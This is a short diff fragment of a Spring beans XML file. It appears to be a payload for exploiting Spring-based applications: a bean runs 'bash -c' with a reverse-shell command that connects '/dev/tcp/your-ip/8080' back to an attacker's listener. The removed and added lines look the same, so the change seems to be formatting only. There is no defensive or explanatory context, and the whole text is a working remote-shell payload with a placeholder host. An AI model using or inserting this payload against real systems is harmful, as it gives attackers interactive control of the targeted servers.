@@ -62,9 +62,9 @@ http://www.springframework.org/schema/beans/spring-beans.xsd">
     <bean init-method="start">
       <constructor-arg >
         <list>
-            <value>bash</value>
-            <value>-c</value>
-            <value><![CDATA[bash -i >& /dev/tcp/your-ip/8080 0>&1]]></value>
+            <value>bash</value>
+            <value>-c</value>
+            <value><![CDATA[bash -i >& /dev/tcp/your-ip/8080 0>&1]]></value>
         </list>
       </constructor-arg>
     </bean>
